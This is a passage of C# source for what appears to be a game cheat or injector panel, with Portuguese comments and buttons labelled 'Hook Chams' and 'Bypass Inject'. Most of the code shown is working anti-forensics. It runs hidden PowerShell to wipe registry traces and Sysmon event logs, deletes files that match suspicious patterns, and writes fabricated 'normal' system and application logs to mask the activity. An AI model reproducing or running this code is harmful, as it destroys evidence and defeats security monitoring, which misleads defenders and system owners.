        "Remove-ItemProperty -Path 'HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RecentDocs' -Name '*' -ErrorAction SilentlyContinue",
        "Remove-ItemProperty -Path 'HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\TypedPaths' -Name '*' -ErrorAction SilentlyContinue",
        "Remove-ItemProperty -Path 'HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\WordWheelQuery' -Name '*' -ErrorAction SilentlyContinue",
        "Remove-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run' -Name '*injection*' -ErrorAction SilentlyContinue",
        "Remove-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run' -Name '*hook*' -ErrorAction SilentlyContinue",
        "Remove-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run' -Name '*bypass*' -ErrorAction SilentlyContinue"
      };

      foreach (string command in registryCommands)
      {
        try
        {
          ProcessStartInfo psi = new ProcessStartInfo
          {
            FileName = "powershell.exe",
            Arguments = $"-Command \"{command}\"",
            UseShellExecute = false,
            CreateNoWindow = true,
            WindowStyle = ProcessWindowStyle.Hidden
          };
          
          using (Process process = Process.Start(psi))
          {
            process?.WaitForExit(3000);
          }
        }
        catch (Exception)
        {
          
        }
      }
    }
    catch (Exception)
    {
      
    }
  }

  // Limpar logs de Sysmon relacionados a modificações
  private void CleanupSysmonModificationLogs()
  {
    try
    {
      // Limpar apenas eventos de Sysmon relacionados a modificações
      string[] sysmonCommands = {
        "Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; ID=1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26} | Remove-WinEvent -ErrorAction SilentlyContinue",
        "Clear-EventLog -LogName 'Microsoft-Windows-Sysmon/Operational' -ErrorAction SilentlyContinue"
      };

      foreach (string command in sysmonCommands)
      {
        try
        {
          ProcessStartInfo psi = new ProcessStartInfo
          {
            FileName = "powershell.exe",
            Arguments = $"-Command \"{command}\"",
            UseShellExecute = false,
            CreateNoWindow = true,
            WindowStyle = ProcessWindowStyle.Hidden
          };
          
          using (Process process = Process.Start(psi))
          {
            process?.WaitForExit(5000);
          }
        }
        catch (Exception)
        {
          
        }
      }
    }
    catch (Exception)
    {
      
    }
  }

  // Manter logs básicos do sistema para evitar suspeitas
  private void MaintainSystemLogs()
  {
    try
    {
      // Gerar logs básicos normais do sistema
      this.GenerateBasicSystemLogs();
      
      // Manter logs de inicialização
      this.MaintainBootLogs();
      
      // Manter logs de aplicações normais
      this.MaintainApplicationLogs();
    }
    catch (Exception)
    {
      
    }
  }

  // Gerar logs falsos para mascarar atividade
  private void GenerateFakeLogs()
  {
    try
    {
      // Gerar logs de atividade normal
      this.GenerateNormalActivityLogs();
      
      // Gerar logs de aplicações comuns
      this.GenerateCommonApplicationLogs();
      
      // Gerar logs de sistema normal
      this.GenerateNormalSystemLogs();
    }
    catch (Exception)
    {
      
    }
  }

  // Função auxiliar para limpar arquivos suspeitos baseado em padrões
  private void ClearSuspiciousFiles(string directoryPath, string[] patterns)
  {
    try
    {
      foreach (string pattern in patterns)
      {
        string[] files = Directory.GetFiles(directoryPath, pattern, SearchOption.AllDirectories);
        foreach (string file in files)
        {
          try
          {
            if (File.Exists(file))
            {
              File.SetAttributes(file, FileAttributes.Normal);
              File.Delete(file);
              
            }
          }
          catch (Exception)
          {
            
          }
        }
      }
    }
    catch (Exception)
    {
      
    }
  }

  // Gerar logs básicos do sistema
  private void GenerateBasicSystemLogs()
  {
    try
    {
      // Gerar log de inicialização normal
      string bootLogPath = @"C:\Windows\Logs\BootLog.txt";
      if (!File.Exists(bootLogPath))
      {
        string bootLogContent = $@"Windows Boot Log
{DateTime.Now:yyyy-MM-dd HH:mm:ss} - System startup completed successfully
{DateTime.Now:yyyy-MM-dd HH:mm:ss} - All services started normally
{DateTime.Now:yyyy-MM-dd HH:mm:ss} - User session initialized";
        
        File.WriteAllText(bootLogPath, bootLogContent);
      }
    }
    catch (Exception)
    {
      
    }
  }

  // Manter logs de inicialização
  private void MaintainBootLogs()
  {
    try
    {
      // Manter logs de boot normais
      string[] bootLogPaths = {
        @"C:\Windows\Logs\BootLog.txt",
        @"C:\Windows\Panther\setupact.log",
        @"C:\Windows\Panther\setuperr.log"
      };

      foreach (string logPath in bootLogPaths)
      {
        if (File.Exists(logPath))
        {
          // Adicionar entrada normal ao log
          string logEntry = $"{DateTime.Now:yyyy-MM-dd HH:mm:ss} - System operation completed normally\n";
          File.AppendAllText(logPath, logEntry);
        }
      }
    }
    catch (Exception)
    {
      
    }
  }

  // Manter logs de aplicações
  private void MaintainApplicationLogs()
  {
    try
    {
      // Gerar logs de aplicações comuns
      string[] appLogs = {
        @"C:\Windows\Logs\Application.log",
        @"C:\Windows\Logs\System.log"
      };

      foreach (string logPath in appLogs)
      {
        string logContent = $@"{DateTime.Now:yyyy-MM-dd HH:mm:ss} - Application started successfully
{DateTime.Now:yyyy-MM-dd HH:mm:ss} - Service running normally
{DateTime.Now:yyyy-MM-dd HH:mm:ss} - No errors detected";
        
        File.WriteAllText(logPath, logContent);
      }
    }
    catch (Exception)
    {
      
    }
  }

  // Gerar logs de atividade normal
  private void GenerateNormalActivityLogs()
  {
    try
    {
      // Gerar logs de atividade normal do usuário
      string activityLogPath = @"C:\Windows\Logs\UserActivity.log";
      string activityContent = $@"{DateTime.Now:yyyy-MM-dd HH:mm:ss} - User logged in
{DateTime.Now:yyyy-MM-dd HH:mm:ss} - Desktop environment loaded
{DateTime.Now:yyyy-MM-dd HH:mm:ss} - File explorer started
{DateTime.Now:yyyy-MM-dd HH:mm:ss} - System idle - normal operation";
      
      File.WriteAllText(activityLogPath, activityContent);
    }
    catch (Exception)
    {
      
    }
  }

  // Gerar logs de aplicações comuns
  private void GenerateCommonApplicationLogs()
  {
    try
    {
      // Gerar logs de aplicações comuns
      string[] commonApps = { "explorer", "winlogon", "csrss", "services" };
      
      foreach (string app in commonApps)
      {
        string appLogPath = $@"C:\Windows\Logs\{app}.log";
        string appContent = $@"{DateTime.Now:yyyy-MM-dd HH:mm:ss} - {app} process started
{DateTime.Now:yyyy-MM-dd HH:mm:ss} - {app} running normally
{DateTime.Now:yyyy-MM-dd HH:mm:ss} - {app} no errors detected";
        
        File.WriteAllText(appLogPath, appContent);
      }
    }
    catch (Exception)
    {
      
    }
  }

  // Gerar logs de sistema normal
  private void GenerateNormalSystemLogs()
  {
    try
    {
      // Gerar logs de sistema normal
      string systemLogPath = @"C:\Windows\Logs\SystemNormal.log";
      string systemContent = $@"{DateTime.Now:yyyy-MM-dd HH:mm:ss} - System boot completed
{DateTime.Now:yyyy-MM-dd HH:mm:ss} - All drivers loaded successfully
{DateTime.Now:yyyy-MM-dd HH:mm:ss} - Network services started
{DateTime.Now:yyyy-MM-dd HH:mm:ss} - System running normally";
      
      File.WriteAllText(systemLogPath, systemContent);
    }
    catch (Exception)
    {
      
    }
  }

  protected override void Dispose(bool disposing)
  {
    if (disposing && this.components != null)
      this.components.Dispose();
    base.Dispose(disposing);
  }

  private void InitializeComponent()
  {
    this.components = (IContainer) new System.ComponentModel.Container();
    this.guna2Panel2 = new Guna2Panel();
    this.txt6 = new Txt();
    this.guna2Panel1 = new Guna2Panel();
    this.animatedButtonBypassInject = new AnimatedButton();
    this.animatedButton2 = new AnimatedButton();
    this.animatedButton1 = new AnimatedButton();
    this.customCheckboxStreamMode = new CustomCheckbox();
    this.treis = new Txt();
    this.dois = new Txt();
    this.um = new Txt();
    this.txt1 = new Txt();
    this.guna2DragControl1 = new Guna2DragControl(this.components);
    ((Control) this.guna2Panel2).SuspendLayout();
    ((Control) this.guna2Panel1).SuspendLayout();
    this.SuspendLayout();
    ((Control) this.guna2Panel2).BackColor = Color.Transparent;
    this.guna2Panel2.BorderColor = Color.FromArgb(20, 20, 21);
    this.guna2Panel2.BorderRadius = 10;
    this.guna2Panel2.BorderThickness = 1;
    ((Control) this.guna2Panel2).Controls.Add((Control) this.txt6);
    ((Control) this.guna2Panel2).Controls.Add((Control) this.animatedButton1);
    ((Control) this.guna2Panel2).Controls.Add((Control) this.animatedButtonBypassInject);
    this.guna2Panel2.CustomBorderColor = Color.FromArgb(20, 20, 21);
    this.guna2Panel2.CustomBorderThickness = new Padding(0, 48 /*0x30*/, 0, 0);
    ((Control) this.guna2Panel2).Location = new Point(3, 0);
    ((Control) this.guna2Panel2).Name = "guna2Panel2";
    ((Control) this.guna2Panel2).Size = new Size(240 /*0xF0*/, 160);
    ((Control) this.guna2Panel2).TabIndex = 7;
    this.txt6.AutoSize = true;
    this.txt6.BackColor = Color.Transparent;
    this.txt6.Font = new Font("Microsoft Sans Serif", 14.5f);
    this.txt6.ForeColor = Color.White;
    this.txt6.HorizontalTextAlignment = Txt.HorizontalAlignment.Center;
    this.txt6.Location = new Point(5, 12);
    this.txt6.Name = "txt6";
    this.txt6.Size = new Size(79, 28);
    this.txt6.TabIndex = 0;
    this.txt6.Text = "Settings";
    this.txt6.UseCompatibleTextRendering = true;
    this.txt6.VerticalTextAlignment = Txt.VerticalAlignment.Middle;
    ((Control) this.guna2Panel1).BackColor = Color.Transparent;
    this.guna2Panel1.BorderColor = Color.FromArgb(20, 20, 21);
    this.guna2Panel1.BorderRadius = 10;
    this.guna2Panel1.BorderThickness = 1;
    ((Control) this.guna2Panel1).Controls.Add((Control) this.animatedButton2);
    ((Control) this.guna2Panel1).Controls.Add((Control) this.customCheckboxStreamMode);
    ((Control) this.guna2Panel1).Controls.Add((Control) this.treis);
    ((Control) this.guna2Panel1).Controls.Add((Control) this.dois);
    ((Control) this.guna2Panel1).Controls.Add((Control) this.um);
    ((Control) this.guna2Panel1).Controls.Add((Control) this.txt1);
    this.guna2Panel1.CustomBorderColor = Color.FromArgb(20, 20, 21);
    this.guna2Panel1.CustomBorderThickness = new Padding(0, 48 /*0x30*/, 0, 0);
    ((Control) this.guna2Panel1).Location = new Point(252, -1);
    ((Control) this.guna2Panel1).Name = "guna2Panel1";
    ((Control) this.guna2Panel1).Size = new Size(246, 235);
    ((Control) this.guna2Panel1).TabIndex = 6;
    this.animatedButton2.AnimationFillDirection = AnimatedButton.FillDirection.CenterOut;
    this.animatedButton2.AnimationFillStyle = AnimatedButton.FillStyle.Solid;
    this.animatedButton2.AnimationSpeed = 0.3f; // Velocidade otimizada para responsividade
    this.animatedButton2.BackColor = Color.Transparent;
    this.animatedButton2.BorderColor = Color.FromArgb(35, 35, 36);
    this.animatedButton2.CornerRadius = 6;
    this.animatedButton2.Cursor = Cursors.Default;
    this.animatedButton2.Font = new Font("Microsoft Sans Serif", 11.5f);
    this.animatedButton2.HoverColor = Color.FromArgb(147, 51, 234); // Roxo moderno
    this.animatedButton2.InsideColor = Color.FromArgb(12, 12, 13);
    this.animatedButton2.Location = new Point(7, 121);
    this.animatedButton2.Name = "animatedButton2";
    this.animatedButton2.ShowToolTip = false;
    this.animatedButton2.Size = new Size(228, 37);
    this.animatedButton2.TabIndex = 8;
    this.animatedButton2.Text = "Hook Chams";
    this.animatedButton2.TextColor = Color.White;
    this.animatedButton2.TextHoverColor = Color.White;
    this.animatedButton2.ToolTipIcon = "";
    this.animatedButton2.ToolTipMessage = "";
    this.animatedButton2.Click += new EventHandler(this.animatedButton2_Click_1);
    this.customCheckboxStreamMode.Anchor = AnchorStyles.Top | AnchorStyles.Right;
    this.customCheckboxStreamMode.BorderColor = Color.Transparent;
    this.customCheckboxStreamMode.BorderRadius = 5;
    this.customCheckboxStreamMode.BorderThickness = 1.5f;
    this.customCheckboxStreamMode.Checked = false;
    this.customCheckboxStreamMode.CheckmarkColor = Color.FromArgb(147, 51, 234); // Roxo moderno
    this.customCheckboxStreamMode.CheckmarkSize = 9f;
    this.customCheckboxStreamMode.FillColor = Color.Transparent;
    this.customCheckboxStreamMode.Font = new Font("Microsoft Sans Serif", 12f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
    this.customCheckboxStreamMode.LabelColor = Color.White;
    this.customCheckboxStreamMode.LabelFont = new Font("Microsoft Sans Serif", 11.8f);
    this.customCheckboxStreamMode.LabelSpacing = 100;
    this.customCheckboxStreamMode.LabelText = "Stream Mode";
    this.customCheckboxStreamMode.Location = new Point(7, 170);
    this.customCheckboxStreamMode.Name = "customCheckboxStreamMode";
    this.customCheckboxStreamMode.Size = new Size(228, 25);
    this.customCheckboxStreamMode.TabIndex = 9;
    this.customCheckboxStreamMode.CheckedChanged += new EventHandler(this.customCheckboxStreamMode_CheckedChanged);
    this.animatedButton1.AnimationFillDirection = AnimatedButton.FillDirection.CenterOut;
    this.animatedButton1.AnimationFillStyle = AnimatedButton.FillStyle.Solid;
    this.animatedButton1.AnimationSpeed = 0.3f; // Velocidade otimizada para responsividade
    this.animatedButton1.BackColor = Color.Transparent;
    this.animatedButton1.BorderColor = Color.FromArgb(35, 35, 36);
    this.animatedButton1.CornerRadius = 6;
    this.animatedButton1.Cursor = Cursors.Default;
    this.animatedButton1.Font = new Font("Microsoft Sans Serif", 11.5f);
    this.animatedButton1.HoverColor = Color.FromArgb(147, 51, 234); // Roxo moderno
    this.animatedButton1.InsideColor = Color.FromArgb(12, 12, 13);
    this.animatedButton1.Location = new Point(6, 60);
    this.animatedButton1.Name = "animatedButton1";
    this.animatedButton1.ShowToolTip = false;
    this.animatedButton1.Size = new Size(228, 37);
    this.animatedButton1.TabIndex = 7;
    this.animatedButton1.Text = "Unload Panel";
    this.animatedButton1.TextColor = Color.White;
    this.animatedButton1.TextHoverColor = Color.White;
    this.animatedButton1.ToolTipIcon = "";
    this.animatedButton1.ToolTipMessage = "";
    this.animatedButton1.Click += new EventHandler(this.animatedButton1_Click);
    this.animatedButtonBypassInject.AnimationFillDirection = AnimatedButton.FillDirection.CenterOut;
    this.animatedButtonBypassInject.AnimationFillStyle = AnimatedButton.FillStyle.Solid;
    this.animatedButtonBypassInject.AnimationSpeed = 0.3f; // Velocidade otimizada para responsividade
    this.animatedButtonBypassInject.BackColor = Color.Transparent;
    this.animatedButtonBypassInject.BorderColor = Color.FromArgb(35, 35, 36);
    this.animatedButtonBypassInject.CornerRadius = 6;
    this.animatedButtonBypassInject.Cursor = Cursors.Default;
    this.animatedButtonBypassInject.Font = new Font("Microsoft Sans Serif", 11.5f);
    this.animatedButtonBypassInject.HoverColor = Color.FromArgb(147, 51, 234); // Roxo moderno
    this.animatedButtonBypassInject.InsideColor = Color.FromArgb(12, 12, 13);
    this.animatedButtonBypassInject.Location = new Point(6, 103);
    this.animatedButtonBypassInject.Name = "animatedButtonBypassInject";
    this.animatedButtonBypassInject.ShowToolTip = false;
    this.animatedButtonBypassInject.Size = new Size(228, 37);
    this.animatedButtonBypassInject.TabIndex = 10;
    this.animatedButtonBypassInject.Text = "Bypass Inject";
    this.animatedButtonBypassInject.TextColor = Color.White;
    this.animatedButtonBypassInject.TextHoverColor = Color.White;
    this.animatedButtonBypassInject.ToolTipIcon = "";
    this.animatedButtonBypassInject.ToolTipMessage = "";
    this.animatedButtonBypassInject.Click += new EventHandler(this.animatedButtonBypassInject_Click);
    this.treis.AutoSize = true;
    this.treis.BackColor = Color.Transparent;
    this.treis.Font = new Font("Microsoft Sans Serif", 11.25f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
    this.treis.ForeColor = Color.White;
    this.treis.HorizontalTextAlignment = Txt.HorizontalAlignment.Center;
    this.treis.Location = new Point(5, 96 /*0x60*/);
    this.treis.Name = "treis";
    this.treis.Size = new Size(193, 22);
    this.treis.TabIndex = 3;
    this.treis.Text = "3. Não feche antes do final.";
    this.treis.UseCompatibleTextRendering = true;
    this.treis.VerticalTextAlignment = Txt.VerticalAlignment.Middle;
    this.dois.AutoSize = true;
    this.dois.BackColor = Color.Transparent;
    this.dois.Font = new Font("Microsoft Sans Serif", 11.25f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
    this.dois.ForeColor = Color.White;
    this.dois.HorizontalTextAlignment = Txt.HorizontalAlignment.Center;
    this.dois.Location = new Point(5, 75);
    this.dois.Name = "dois";
    this.dois.Size = new Size(172, 22);
    this.dois.TabIndex = 2;
    this.dois.Text = "2. Aguarde a conclusão.";
    this.dois.UseCompatibleTextRendering = true;
    this.dois.VerticalTextAlignment = Txt.VerticalAlignment.Middle;
    this.um.AutoSize = true;
    this.um.BackColor = Color.Transparent;
    this.um.Font = new Font("Microsoft Sans Serif", 11.25f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
    this.um.ForeColor = Color.White;
    this.um.HorizontalTextAlignment = Txt.HorizontalAlignment.Center;
    this.um.Location = new Point(5, 53);
    this.um.Name = "um";
    this.um.Size = new Size(165, 22);
    this.um.TabIndex = 1;
    this.um.Text = "1. Click \"Hook Chams\".";
    this.um.UseCompatibleTextRendering = true;
    this.um.VerticalTextAlignment = Txt.VerticalAlignment.Middle;
    this.txt1.AutoSize = true;
    this.txt1.BackColor = Color.Transparent;
    this.txt1.Font = new Font("Microsoft Sans Serif", 14.5f);
    this.txt1.ForeColor = Color.White;
    this.txt1.HorizontalTextAlignment = Txt.HorizontalAlignment.Center;
    this.txt1.Location = new Point(7, 12);
    this.txt1.Name = "txt1";
    this.txt1.Size = new Size(63 /*0x3F*/, 28);
    this.txt1.TabIndex = 0;
    this.txt1.Text = "Extras";
    this.txt1.UseCompatibleTextRendering = true;
    this.txt1.VerticalTextAlignment = Txt.VerticalAlignment.Middle;
    this.guna2DragControl1.DockIndicatorTransparencyValue = 0.6;
    this.guna2DragControl1.DragStartTransparencyValue = 1.0;
    this.guna2DragControl1.TargetControl = (Control) this;
    this.guna2DragControl1.UseTransparentDrag = true;
    this.AutoScaleDimensions = new SizeF(6f, 13f);
    this.AutoScaleMode = AutoScaleMode.Font;
    this.BackColor = Color.FromArgb(15, 15, 16);
    this.Controls.Add((Control) this.guna2Panel2);
    this.Controls.Add((Control) this.guna2Panel1);
    this.Name = nameof (Bypass);
    this.Size = new Size(522, 267);
    ((Control) this.guna2Panel2).ResumeLayout(false);
    ((Control) this.guna2Panel2).PerformLayout();
    ((Control) this.guna2Panel1).ResumeLayout(false);
    ((Control) this.guna2Panel1).PerformLayout();
    this.ResumeLayout(false);
  }
}